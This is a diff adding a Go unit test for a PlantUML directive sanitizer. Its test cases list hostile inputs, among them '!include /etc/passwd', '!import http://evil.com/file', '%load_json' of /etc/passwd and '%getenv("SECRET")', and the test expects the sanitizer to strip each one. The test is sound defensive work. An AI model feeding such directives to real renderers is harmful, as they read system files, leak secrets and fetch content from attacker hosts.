@@ -481,3 +481,46 @@ func TestRenderLocalWithFakePlantuml(t *testing.T) {
 		t.Fatalf("expected SVG output, got: %s", svg)
 	}
 }
+
+// TestSanitizePlantUMLCode tests the directive sanitizer.
+func TestSanitizePlantUMLCode(t *testing.T) {
+	tests := []struct {
+		name     string
+		input    string
+		wantSafe bool // true if the output should NOT contain the directive
+	}{
+		{"include directive", "!include /etc/passwd", true},
+		{"import directive", "!import http://evil.com/file", true},
+		{"include with whitespace", "  !INCLUDE foo.puml", true},
+		{"include_many", "!include_many files.txt", true},
+		{"define directive", "!define MY_VAR", true},
+		{"theme directive", "!theme cerulean", true},
+		{"theme from url", "!theme cerulean from http://evil.com", true},
+		{"pragma directive", "!pragma useVerticalIf on", true},
+		{"%load_json", "%load_json(\"/etc/passwd\")", true},
+		{"%getenv", "%getenv(\"SECRET\")", true},
+		{"%filename", "title %filename()", true},
+		{"%dirpath", "title %dirpath()", true},
+		{"normal code", "Alice -> Bob: Hello", false},
+		{"comment", "' this is a comment", false},
+		{"participant", "participant Alice", false},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			result := sanitizePlantUMLCode(tt.input)
+			hasRemoval := strings.Contains(result, "[directive removed for security]")
+			if tt.wantSafe && !hasRemoval {
+				t.Errorf("expected directive to be removed, got: %q", result)
+			} else if tt.wantSafe && strings.Contains(result, tt.input) {
+				t.Errorf("original directive should not appear in output")
+			} else if !tt.wantSafe {
+				if hasRemoval {
+					t.Errorf("safe input should not be modified, got: %q", result)
+				}
+				if result != tt.input {
+					t.Errorf("safe input should be unchanged: want %q, got %q", tt.input, result)
+				}
+			}
+		})
+	}
+}
